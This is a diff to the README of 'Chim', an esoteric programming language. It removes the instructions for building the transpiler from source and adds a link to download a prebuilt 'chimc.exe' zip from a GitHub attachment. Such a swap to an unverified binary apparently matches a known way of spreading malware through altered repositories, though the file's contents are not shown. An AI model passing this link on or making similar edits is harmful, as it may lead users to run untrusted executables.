@@ -12,14 +12,7 @@ Chim is an esoteric programming language where every keyword is a chemical eleme
 
 ### Requirements
 - `gcc` in PATH ([MinGW-w64](https://www.mingw-w64.org/) on Windows, `gcc` on Linux/Mac)
-
-### Build the transpiler
-
-```bash
-gcc chim.c -o chimc
-```
-
-That's it. You now have `chimc` — the Chim transpiler.
+- `chimc.exe` [click to download](https://github.com/user-attachments/files/25788742/Chimlang_v0.3.zip)
 
 ---
 
@@ -32,7 +25,7 @@ That's it. You now have `chimc` — the Chim transpiler.
 This will:
 1. Read `input.chim`
 2. Transpile it to `output.c`
-3. Compile `output.c` via `gcc` → `output` / `output.exe`
+3. Compile `output.c` via `gcc` → `output.exe`
 
 ---
 
